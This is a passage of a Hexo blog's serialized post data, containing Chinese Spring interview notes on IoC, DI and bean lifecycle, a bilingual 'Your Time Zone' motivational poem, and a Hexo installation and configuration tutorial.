title=\"4、什么是依赖注入\"></a>4、什么是依赖注入</h4><p>DI、IOC是同一个概念。依赖注入是当一个对象需要依赖另一个对象的协助时，创建、管理被依赖对象的工作由Spring来完成，而不是由调用者完成，因此称为控制反转，创建被依赖对象的实例也是由spirng容器来创建，并注入给调用者，因此称为依赖注入。</p>\n<h4 id=\"5、Spring在SSM中起什么作用\"><a href=\"#5、Spring在SSM中起什么作用\" class=\"headerlink\" title=\"5、Spring在SSM中起什么作用\"></a>5、Spring在SSM中起什么作用</h4><ul>\n<li>spring： 是一个轻量级框架</li>\n<li>作用： Bean工厂，用来管理Bean的声明周期和框架集成</li>\n<li>两大核心： <ul>\n<li>IOC/DI(控制反转/依赖注入)，由spring控制将所需的对象注入到相应的类中，spring顶层容器为BeanFactory</li>\n<li>AOP：面向切面编程</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"6、Spring的事务\"><a href=\"#6、Spring的事务\" class=\"headerlink\" title=\"6、Spring的事务\"></a>6、Spring的事务</h4><ul>\n<li>编程式事务： 编程方式管理事务，灵活，但难管理</li>\n<li>声明式事务： 将业务代码和事务管理分离，用注解和xml配置来管理事务</li>\n</ul>\n<h4 id=\"7、IOC在项目中的作用\"><a href=\"#7、IOC在项目中的作用\" class=\"headerlink\" title=\"7、IOC在项目中的作用\"></a>7、IOC在项目中的作用</h4><p>IOC解决了对象之间的依赖问题，把所有的Bean的依赖关系通过注解或者配置文件关联起来尽心管理，降低和耦合度。</p>\n<h4 id=\"8、Spring-DI的注入方式\"><a href=\"#8、Spring-DI的注入方式\" class=\"headerlink\" title=\"8、Spring DI的注入方式\"></a>8、Spring DI的注入方式</h4><ul>\n<li>构造注入</li>\n<li>set注入</li>\n<li>接口注入</li>\n</ul>\n<h4 id=\"9、IOC、AOP实现原理\"><a href=\"#9、IOC、AOP实现原理\" class=\"headerlink\" title=\"9、IOC、AOP实现原理\"></a>9、IOC、AOP实现原理</h4><ul>\n<li>IOC：通过反射机制生成对象进行注入</li>\n<li>AOP：通过动态代理</li>\n</ul>\n<h4 id=\"10、Spring-MVC的架构-工作流程图\"><a href=\"#10、Spring-MVC的架构-工作流程图\" class=\"headerlink\" title=\"10、Spring MVC的架构/工作流程图\"></a>10、Spring MVC的架构/工作流程图</h4><img src=\"/posts/2018-11-02-Spring面试题/springmvc流程图.jpg\">\n<h4 id=\"11、spring-bean的作用域\"><a href=\"#11、spring-bean的作用域\" class=\"headerlink\" title=\"11、spring bean的作用域\"></a>11、spring bean的作用域</h4><p>Spring中通过scope来配置Bean的作用域，scope有五个属性，用来描述不同的作用域</p>\n<ul>\n<li>singleton： 使用该属性定义Bean时，IOC容器仅创建一个Bean实例，IOC容器每次返回的是同一个Bean实例。</li>\n<li>prototype：使用该属性定义Bean时，IOC容器可以创建多个Bean实例，每次返回的都是一个新的实例。</li>\n<li>request：该属性仅对HTTP请求产生作用，使用该属性定义Bean时，每次HTTP请求都会创建一个新的Bean，适用于WebApplicationContext环境。</li>\n<li><p>session： 该属性仅用于HTTP Session，同一个Session共享一个Bean实例。不同的Session使用不同的实例。</p>\n</li>\n<li><p>global-session： 该属性仅用于HTTP Session，同Session作用域不同的是，所有的session共享一个Bean实例。</p>\n</li>\n</ul>\n<h4 id=\"12、spring-boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？\"><a href=\"#12、spring-boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？\" class=\"headerlink\" title=\"12、spring boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？\"></a>12、spring boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？</h4><h4 id=\"13、如何自定义一个spirng-boot-starter\"><a href=\"#13、如何自定义一个spirng-boot-starter\" class=\"headerlink\" title=\"13、如何自定义一个spirng boot starter\"></a>13、如何自定义一个spirng boot starter</h4><h4 id=\"24、Servlet的生命周期\"><a href=\"#24、Servlet的生命周期\" class=\"headerlink\" title=\"24、Servlet的生命周期\"></a>24、Servlet的生命周期</h4><script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1、consul的可靠性\"><a href=\"#1、consul的可靠性\" class=\"headerlink\" title=\"1、consul的可靠性\"></a>1、consul的可靠性</h4><h4 id=\"2、spring的原理，AOP-IOC原理，使用场景\"><a href=\"#2、spring的原理，AOP-IOC原理，使用场景\" class=\"headerlink\" title=\"2、spring的原理，AOP/IOC原理，使用场景\"></a>2、spring的原理，AOP/IOC原理，使用场景</h4><h4 id=\"3、spring-bean生命周期\"><a href=\"#3、spring-bean生命周期\" class=\"headerlink\" title=\"3、spring bean生命周期\"></a>3、spring bean生命周期</h4><img src=\"/posts/2018-11-02-Spring面试题/spring%20bean生命周期.jpg\">\n<ul>\n<li>实例化一个Bean，也就是我们常说的new</li>\n<li>按照Spring上下文对实例化的Bean进行配置，即 IOC 注入</li>\n<li>如果这个Bean已经实现了BeanNameAware接口，会调用它实现的setBeanName(String)方法，此处传递的就是spring配置文件中Bean的ID值</li>\n<li>如果这个Bena已经实现了BeanFactoryAware接口，会调用它实现的setBeanFactory(BeanFactory)传递Spring工厂自身</li>\n<li>如果这个Bean已经实现了ApplicationContextAware接口，会调用setApplicationContext(ApplicationContext)方法，传入Spring上下文</li>\n<li>如果这个Bean关联了BenaPostProcessor接口，将会调用postProcessBeforeInitialization(Object obj, String s)方法，BeanPostPorcessor经常被用作Bean内容的更改，并且由于这个是在Bena初始化结束时调用哪个的方法，也可以被应用于内存或缓存技术。</li>\n<li>如果Bena在Spring配置文件中配置了init-method属性会自动调用其配置的初始化方法。</li>\n<li>如果这个Bean关联了BeanPostProcessor接口，将会调用postPorcessAfterInitialization(Object obj, String s)方法</li>\n<li>以上工作完成之后就可以应用这个Bean了，那这个Bean是一个Singleton的，所以一般情况下我们调用同一个ID的Bean会是在内容地址相同的实例，当然在Spring配置文件中也可以配置非Singleton</li>\n<li>当Bena不再需要时，会经过清理阶段，如果Bean实现了DisposableBena接口，会调用其实现的destroy()方法</li>\n<li>最后，如果这个Bean在Spring中配置了destroy-method属性，会自动调用其配置的销毁方法。</li>\n</ul>\n<h4 id=\"4、什么是依赖注入\"><a href=\"#4、什么是依赖注入\" class=\"headerlink\" title=\"4、什么是依赖注入\"></a>4、什么是依赖注入</h4><p>DI、IOC是同一个概念。依赖注入是当一个对象需要依赖另一个对象的协助时，创建、管理被依赖对象的工作由Spring来完成，而不是由调用者完成，因此称为控制反转，创建被依赖对象的实例也是由spirng容器来创建，并注入给调用者，因此称为依赖注入。</p>\n<h4 id=\"5、Spring在SSM中起什么作用\"><a href=\"#5、Spring在SSM中起什么作用\" class=\"headerlink\" title=\"5、Spring在SSM中起什么作用\"></a>5、Spring在SSM中起什么作用</h4><ul>\n<li>spring： 是一个轻量级框架</li>\n<li>作用： Bean工厂，用来管理Bean的声明周期和框架集成</li>\n<li>两大核心： <ul>\n<li>IOC/DI(控制反转/依赖注入)，由spring控制将所需的对象注入到相应的类中，spring顶层容器为BeanFactory</li>\n<li>AOP：面向切面编程</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"6、Spring的事务\"><a href=\"#6、Spring的事务\" class=\"headerlink\" title=\"6、Spring的事务\"></a>6、Spring的事务</h4><ul>\n<li>编程式事务： 编程方式管理事务，灵活，但难管理</li>\n<li>声明式事务： 将业务代码和事务管理分离，用注解和xml配置来管理事务</li>\n</ul>\n<h4 id=\"7、IOC在项目中的作用\"><a href=\"#7、IOC在项目中的作用\" class=\"headerlink\" title=\"7、IOC在项目中的作用\"></a>7、IOC在项目中的作用</h4><p>IOC解决了对象之间的依赖问题，把所有的Bean的依赖关系通过注解或者配置文件关联起来尽心管理，降低和耦合度。</p>\n<h4 id=\"8、Spring-DI的注入方式\"><a href=\"#8、Spring-DI的注入方式\" class=\"headerlink\" title=\"8、Spring DI的注入方式\"></a>8、Spring DI的注入方式</h4><ul>\n<li>构造注入</li>\n<li>set注入</li>\n<li>接口注入</li>\n</ul>\n<h4 id=\"9、IOC、AOP实现原理\"><a href=\"#9、IOC、AOP实现原理\" class=\"headerlink\" title=\"9、IOC、AOP实现原理\"></a>9、IOC、AOP实现原理</h4><ul>\n<li>IOC：通过反射机制生成对象进行注入</li>\n<li>AOP：通过动态代理</li>\n</ul>\n<h4 id=\"10、Spring-MVC的架构-工作流程图\"><a href=\"#10、Spring-MVC的架构-工作流程图\" class=\"headerlink\" title=\"10、Spring MVC的架构/工作流程图\"></a>10、Spring MVC的架构/工作流程图</h4><img src=\"/posts/2018-11-02-Spring面试题/springmvc流程图.jpg\">\n<h4 id=\"11、spring-bean的作用域\"><a href=\"#11、spring-bean的作用域\" class=\"headerlink\" title=\"11、spring bean的作用域\"></a>11、spring bean的作用域</h4><p>Spring中通过scope来配置Bean的作用域，scope有五个属性，用来描述不同的作用域</p>\n<ul>\n<li>singleton： 使用该属性定义Bean时，IOC容器仅创建一个Bean实例，IOC容器每次返回的是同一个Bean实例。</li>\n<li>prototype：使用该属性定义Bean时，IOC容器可以创建多个Bean实例，每次返回的都是一个新的实例。</li>\n<li>request：该属性仅对HTTP请求产生作用，使用该属性定义Bean时，每次HTTP请求都会创建一个新的Bean，适用于WebApplicationContext环境。</li>\n<li><p>session： 该属性仅用于HTTP Session，同一个Session共享一个Bean实例。不同的Session使用不同的实例。</p>\n</li>\n<li><p>global-session： 该属性仅用于HTTP Session，同Session作用域不同的是，所有的session共享一个Bean实例。</p>\n</li>\n</ul>\n<h4 id=\"12、spring-boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？\"><a href=\"#12、spring-boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？\" class=\"headerlink\" title=\"12、spring boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？\"></a>12、spring boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？</h4><h4 id=\"13、如何自定义一个spirng-boot-starter\"><a href=\"#13、如何自定义一个spirng-boot-starter\" class=\"headerlink\" title=\"13、如何自定义一个spirng boot starter\"></a>13、如何自定义一个spirng boot starter</h4><h4 id=\"24、Servlet的生命周期\"><a href=\"#24、Servlet的生命周期\" class=\"headerlink\" title=\"24、Servlet的生命周期\"></a>24、Servlet的生命周期</h4><script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"Your Time Zone","date":"2019-03-07T03:09:16.000Z","_content":"\n\n\nNew York is 3 Hours ahead of California,\n纽约比加州时间早三个小时，\n\n\nBut it does not make California slow.\n但是加州的时间并没有变慢。\n\n\nSomeone graduated at age of 22,\n有人22岁就毕业了，\n\n\nbut waited 5 years brfore securing a good job！\n但等了5年才找到好的工作！\n\n\nSomeone became a CEO at 25，\n有人25岁就当上CEO，\n\n\nand dieed at 50.\n却在50岁去世。\n\n\nWhile another became a CEO at 50，\n也有人直到50岁才当上CEO，\n\n\nand lived to 90 years。\n然后活到90岁。\n\n\nSomeone is still single，\n有些人依然单身，\n\n\nwhile someone else got married.\n而有些人已经成婚。\n\n\nObama retires at 55,\n奥巴马55岁就退休了，\n\n\nbut Trump starts at 70.\n但是川普70才当上总统。\n\n\nAbsolutely everyone in this world works based on their Time Zone.\n世上每个人本来就有自己的发展时区。\n\n\nPeople arount you might seem to go ahead of you,\n身边有些人可能走在你的前面，\n\n\nsome might seem to be behind you.\n也有些可能在你的后边。\n\n\nBut everyone is running their own RACE, in their own TIME.\n但是每个人都在自己的时区，有着自己的步长\n\n\nDont't envy them or mock them.\n不用嫉妒或嘲讽他们，\n\n\nThey are in their TIME ZONE, and you are in yours!\n他们都在自己的时区里，你也是！\n\n\nLife is about waiting for the right moment to act.\n生命就是在等待正确的行动时机。\n\n\nSo, relax.\nso，放轻松点。\n\n\nYou are not LATE.\n你没有落后，\n\n\nAnd you are not EARLY.\n也没有领先，\n\n\nYou are very much ON TIME, and in your TIME ZONE Desting set up for you.\n在命运为你安排的属于自己的时区里，一切都非常准时。\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/Your-Time-Zone.md","raw":"---\ntitle: Your Time Zone\ndate: 2019-03-07 11:09:16\ntags:\ncategories:\n---\n\n\n\nNew York is 3 Hours ahead of California,\n纽约比加州时间早三个小时，\n\n\nBut it does not make California slow.\n但是加州的时间并没有变慢。\n\n\nSomeone graduated at age of 22,\n有人22岁就毕业了，\n\n\nbut waited 5 years brfore securing a good job！\n但等了5年才找到好的工作！\n\n\nSomeone became a CEO at 25，\n有人25岁就当上CEO，\n\n\nand dieed at 50.\n却在50岁去世。\n\n\nWhile another became a CEO at 50，\n也有人直到50岁才当上CEO，\n\n\nand lived to 90 years。\n然后活到90岁。\n\n\nSomeone is still single，\n有些人依然单身，\n\n\nwhile someone else got married.\n而有些人已经成婚。\n\n\nObama retires at 55,\n奥巴马55岁就退休了，\n\n\nbut Trump starts at 70.\n但是川普70才当上总统。\n\n\nAbsolutely everyone in this world works based on their Time Zone.\n世上每个人本来就有自己的发展时区。\n\n\nPeople arount you might seem to go ahead of you,\n身边有些人可能走在你的前面，\n\n\nsome might seem to be behind you.\n也有些可能在你的后边。\n\n\nBut everyone is running their own RACE, in their own TIME.\n但是每个人都在自己的时区，有着自己的步长\n\n\nDont't envy them or mock them.\n不用嫉妒或嘲讽他们，\n\n\nThey are in their TIME ZONE, and you are in yours!\n他们都在自己的时区里，你也是！\n\n\nLife is about waiting for the right moment to act.\n生命就是在等待正确的行动时机。\n\n\nSo, relax.\nso，放轻松点。\n\n\nYou are not LATE.\n你没有落后，\n\n\nAnd you are not EARLY.\n也没有领先，\n\n\nYou are very much ON TIME, and in your TIME ZONE Desting set up for you.\n在命运为你安排的属于自己的时区里，一切都非常准时。\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"Your-Time-Zone","published":1,"updated":"2019-06-26T03:52:03.503Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gk000to25to8b3j9cd","content":"<p>New York is 3 Hours ahead of California,<br>纽约比加州时间早三个小时，</p>\n<p>But it does not make California slow.<br>但是加州的时间并没有变慢。</p>\n<p>Someone graduated at age of 22,<br>有人22岁就毕业了，</p>\n<p>but waited 5 years brfore securing a good job！<br>但等了5年才找到好的工作！</p>\n<p>Someone became a CEO at 25，<br>有人25岁就当上CEO，</p>\n<p>and dieed at 50.<br>却在50岁去世。</p>\n<p>While another became a CEO at 50，<br>也有人直到50岁才当上CEO，</p>\n<p>and lived to 90 years。<br>然后活到90岁。</p>\n<p>Someone is still single，<br>有些人依然单身，</p>\n<p>while someone else got married.<br>而有些人已经成婚。</p>\n<p>Obama retires at 55,<br>奥巴马55岁就退休了，</p>\n<p>but Trump starts at 70.<br>但是川普70才当上总统。</p>\n<p>Absolutely everyone in this world works based on their Time Zone.<br>世上每个人本来就有自己的发展时区。</p>\n<p>People arount you might seem to go ahead of you,<br>身边有些人可能走在你的前面，</p>\n<p>some might seem to be behind you.<br>也有些可能在你的后边。</p>\n<p>But everyone is running their own RACE, in their own TIME.<br>但是每个人都在自己的时区，有着自己的步长</p>\n<p>Dont’t envy them or mock them.<br>不用嫉妒或嘲讽他们，</p>\n<p>They are in their TIME ZONE, and you are in yours!<br>他们都在自己的时区里，你也是！</p>\n<p>Life is about waiting for the right moment to act.<br>生命就是在等待正确的行动时机。</p>\n<p>So, relax.<br>so，放轻松点。</p>\n<p>You are not LATE.<br>你没有落后，</p>\n<p>And you are not EARLY.<br>也没有领先，</p>\n<p>You are very much ON TIME, and in your TIME ZONE Desting set up for you.<br>在命运为你安排的属于自己的时区里，一切都非常准时。</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p>New York is 3 Hours ahead of California,<br>纽约比加州时间早三个小时，</p>\n<p>But it does not make California slow.<br>但是加州的时间并没有变慢。</p>\n<p>Someone graduated at age of 22,<br>有人22岁就毕业了，</p>\n<p>but waited 5 years brfore securing a good job！<br>但等了5年才找到好的工作！</p>\n<p>Someone became a CEO at 25，<br>有人25岁就当上CEO，</p>\n<p>and dieed at 50.<br>却在50岁去世。</p>\n<p>While another became a CEO at 50，<br>也有人直到50岁才当上CEO，</p>\n<p>and lived to 90 years。<br>然后活到90岁。</p>\n<p>Someone is still single，<br>有些人依然单身，</p>\n<p>while someone else got married.<br>而有些人已经成婚。</p>\n<p>Obama retires at 55,<br>奥巴马55岁就退休了，</p>\n<p>but Trump starts at 70.<br>但是川普70才当上总统。</p>\n<p>Absolutely everyone in this world works based on their Time Zone.<br>世上每个人本来就有自己的发展时区。</p>\n<p>People arount you might seem to go ahead of you,<br>身边有些人可能走在你的前面，</p>\n<p>some might seem to be behind you.<br>也有些可能在你的后边。</p>\n<p>But everyone is running their own RACE, in their own TIME.<br>但是每个人都在自己的时区，有着自己的步长</p>\n<p>Dont’t envy them or mock them.<br>不用嫉妒或嘲讽他们，</p>\n<p>They are in their TIME ZONE, and you are in yours!<br>他们都在自己的时区里，你也是！</p>\n<p>Life is about waiting for the right moment to act.<br>生命就是在等待正确的行动时机。</p>\n<p>So, relax.<br>so，放轻松点。</p>\n<p>You are not LATE.<br>你没有落后，</p>\n<p>And you are not EARLY.<br>也没有领先，</p>\n<p>You are very much ON TIME, and in your TIME ZONE Desting set up for you.<br>在命运为你安排的属于自己的时区里，一切都非常准时。</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"hexo-安装及配置","date":"2018-09-07T10:39:40.000Z","_content":"\n## 前言\n曾几何时，你是否也想有个自己的博客，抒发自己的心情，总结自己的得失，与人分享喜悦、哀伤、愤怒、忧愁，那么这篇文章你就必须看了，非常简单搭建一个自己的开源博客。\n\n## 一、预备\n  \n**1、安装Nodejs及npm**\n\nNodejs下载地址： [官网下载地址：https://nodejs.org/zh-cn/download/](https://nodejs.org/zh-cn/download/)\n\n**2、安装Git**\n\nGit下载地址： [官网下载地址：https://git-scm.com/download/](https://git-scm.com/download/)\n\n安装完成后，执行如下命令，可以显示版本号就算安装成功了  \n\n```shell\n$ node -v\nv9.11.1\n\n$ npm -v\n6.3.0\n\n$ git --version\ngit version 2.17.0.windows.1\n```\n\n## 二、安装hexo \n\n进入命令行，执行如下命令:  \n\n```shell\n1、全局安装hexo\n$ npm install hexo -g\n\n2、创建hexo工作目录\n$ mkdir hexo-blog\n$ cd hexo-blog\n\n3、初始化工作目录\n$ hexo init\n\n4、本地启动hexo\n$ hexo serve\n```\n  \n到此一个hexo博客已经搭建完成了，可以访问 http://localhost:4000/ 查看博客的效果。\n\n<br>\n\n当然现在你就可以开始写博客了，默认的配置足够你写作、发表文章了，但是默认的东西有些并不符合自己的要求和审美。所以下面对hexo进行一些配置，以符合自己的要求。\n\n## 三、hexo配置\n\nhexo的配置文件在根目录下_config.yml文件中。本文仅列举几项，其余配置可以参照[hexo官网文档](https://hexo.io/zh-cn/docs/configuration.html)进行配置，当然，有兴趣可以参照[我的配置](https://github.com/AriesRen/ariesren.github.io)\n\n\n网站配置：\n```yml\n# Site\ntitle: Aries' blog 网站标题\nsubtitle: 副标题\ndescription: 我不生产知识，我只是知识的搬运工。 网站一句话描述\nkeywords: 关键词\nauthor: 无名万物 作者\nlanguage: zh-CN 语言\ntimezone: Asia/Shanghai 时区\n```\n\n文章配置： \n```yml\nurl: http://blog.renhj.org  网站url\nroot: /   文章根路径\npermalink: posts/:year-:month-:day-:title.html  文章url\npermalink_defaults:\n```\n\n## 四、创建新文章\n\n你可以通过以下命令来创建一篇新文章\n```shell\nhexo new [layout] <title>\n```\n\n命令中指令文章的布局，默认为post，可以通过修改_config.yml中的default_layout来修改默认布局，当然也可以在文章Front-Matter上添加布局.\n\n\n当然也可以新建一个草稿： draft，这种布局在建立时会保存到`source/_drafts`文件夹，也可以通过`publish`来将草稿移动到正式文件夹。\n\n```shell\n# 新建草稿文章\n$ hexo new draft <title>\n\n# 将文章正式发布\n$ hexo publish [layout] <title>\n```\n\n**Front-matter**\n\nFront-matter是文章最上方以`---` 分割的区域，用于指定个别文件的变量\n\n```\n---\nlayout: 指定文章的布局属性\ntitle： 文章标题\ndata：建立日期\nupdated： 更新日期\ncomments： 是否开启文章的评论功能(如果有的话)\ntags： 标签\ncategories：分类\npermalink： 覆盖文章的网址\n---\n```\n\n\n##  修改美化\n\n\n默认的主题是有点丑，可以去[hexo的主题商店](https://hexo.io/themes/) 找一个自己喜欢的、漂亮的主题。\n\n本人找的是网上比较流行的nexT的主题，即本博客所使用的主题：[hexo nexT主题](http://theme-next.iissnan.com/)，更多的配置可以参照nexT官网的配置或者其他文章进行配置。本文就不再这里赘述的，具体效果可以看本博客的。\n\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/hexo-安装及配置.md","raw":"---\ntitle: hexo-安装及配置\ndate: 2018-09-07 18:39:40\ntags: ['hexo','博客', 'nexT','Github Pages']\ncategories: hexo\n---\n\n## 前言\n曾几何时，你是否也想有个自己的博客，抒发自己的心情，总结自己的得失，与人分享喜悦、哀伤、愤怒、忧愁，那么这篇文章你就必须看了，非常简单搭建一个自己的开源博客。\n\n## 一、预备\n  \n**1、安装Nodejs及npm**\n\nNodejs下载地址： [官网下载地址：https://nodejs.org/zh-cn/download/](https://nodejs.org/zh-cn/download/)\n\n**2、安装Git**\n\nGit下载地址： [官网下载地址：https://git-scm.com/download/](https://git-scm.com/download/)\n\n安装完成后，执行如下命令，可以显示版本号就算安装成功了  \n\n```shell\n$ node -v\nv9.11.1\n\n$ npm -v\n6.3.0\n\n$ git --version\ngit version 2.17.0.windows.1\n```\n\n## 二、安装hexo \n\n进入命令行，执行如下命令:  \n\n```shell\n1、全局安装hexo\n$ npm install hexo -g\n\n2、创建hexo工作目录\n$ mkdir hexo-blog\n$ cd hexo-blog\n\n3、初始化工作目录\n$ hexo init\n\n4、本地启动hexo\n$ hexo serve\n```\n  \n到此一个hexo博客已经搭建完成了，可以访问 http://localhost:4000/ 查看博客的效果。\n\n<br>\n\n当然现在你就可以开始写博客了，默认的配置足够你写作、发表文章了，但是默认的东西有些并不符合自己的要求和审美。所以下面对hexo进行一些配置，以符合自己的要求。\n\n## 三、hexo配置\n\nhexo的配置文件在根目录下_config.yml文件中。本文仅列举几项，其余配置可以参照[hexo官网文档](https://hexo.io/zh-cn/docs/configuration.html)进行配置，当然，有兴趣可以参照[我的配置](https://github.com/AriesRen/ariesren.github.io)\n\n\n网站配置：\n```yml\n# Site\ntitle: Aries' blog 网站标题\nsubtitle: 副标题\ndescription: 我不生产知识，我只是知识的搬运工。 网站一句话描述\nkeywords: 关键词\nauthor: 无名万物 作者\nlanguage: zh-CN 语言\ntimezone: Asia/Shanghai 时区\n```\n\n文章配置： \n```yml\nurl: http://blog.renhj.org  网站url\nroot: /   文章根路径\npermalink: posts/:year-:month-:day-:title.html  文章url\npermalink_defaults:\n```\n\n## 四、创建新文章\n\n你可以通过以下命令来创建一篇新文章\n```shell\nhexo new [layout] <title>\n```\n\n命令中指令文章的布局，默认为post，可以通过修改_config.yml中的default_layout来修改默认布局，当然也可以在文章Front-Matter上添加布局.\n\n\n当然也可以新建一个草稿： draft，这种布局在建立时会保存到`source/_drafts`文件夹，也可以通过`publish`来将草稿移动到正式文件夹。\n\n```shell\n# 新建草稿文章\n$ hexo new draft <title>\n\n# 将文章正式发布\n$ hexo publish [layout] <title>\n```\n\n**Front-matter**\n\nFront-matter是文章最上方以`---` 分割的区域，用于指定个别文件的变量\n\n```\n---\nlayout: 指定文章的布局属性\ntitle： 文章标题\ndata：建立日期\nupdated： 更新日期\ncomments： 是否开启文章的评论功能(如果有的话)\ntags： 标签\ncategories：分类\npermalink： 覆盖文章的网址\n---\n```\n\n\n##  修改美化\n\n\n默认的主题是有点丑，可以去[hexo的主题商店](https://hexo.io/themes/) 找一个自己喜欢的、漂亮的主题。\n\n本人找的是网上比较流行的nexT的主题，即本博客所使用的主题：[hexo nexT主题](http://theme-next.iissnan.com/)，更多的配置可以参照nexT官网的配置或者其他文章进行配置。本文就不再这里赘述的，具体效果可以看本博客的。\n\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"hexo-安装及配置","published":1,"updated":"2019-06-26T03:52:03.504Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gl000xo25tw8hht0jp","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>曾几何时，你是否也想有个自己的博客，抒发自己的心情，总结自己的得失，与人分享喜悦、哀伤、愤怒、忧愁，那么这篇文章你就必须看了，非常简单搭建一个自己的开源博客。</p>\n<h2 id=\"一、预备\"><a href=\"#一、预备\" class=\"headerlink\" title=\"一、预备\"></a>一、预备</h2><p><strong>1、安装Nodejs及npm</strong></p>\n<p>Nodejs下载地址： <a href=\"https://nodejs.org/zh-cn/download/\" target=\"_blank\" rel=\"noopener\">官网下载地址：https://nodejs.org/zh-cn/download/</a></p>\n<p><strong>2、安装Git</strong></p>\n<p>Git下载地址： <a href=\"https://git-scm.com/download/\" target=\"_blank\" rel=\"noopener\">官网下载地址：https://git-scm.com/download/</a></p>\n<p>安装完成后，执行如下命令，可以显示版本号就算安装成功了  </p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> node -v</span></span><br><span class=\"line\">v9.11.1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> npm -v</span></span><br><span class=\"line\">6.3.0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> git --version</span></span><br><span class=\"line\">git version 2.17.0.windows.1</span><br></pre></td></tr></table></figure>\n<h2 id=\"二、安装hexo\"><a href=\"#二、安装hexo\" class=\"headerlink\" title=\"二、安装hexo\"></a>二、安装hexo</h2><p>进入命令行，执行如下命令:  </p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、全局安装hexo</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> npm install hexo -g</span></span><br><span class=\"line\"></span><br><span class=\"line\">2、创建hexo工作目录</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> mkdir hexo-blog</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> <span 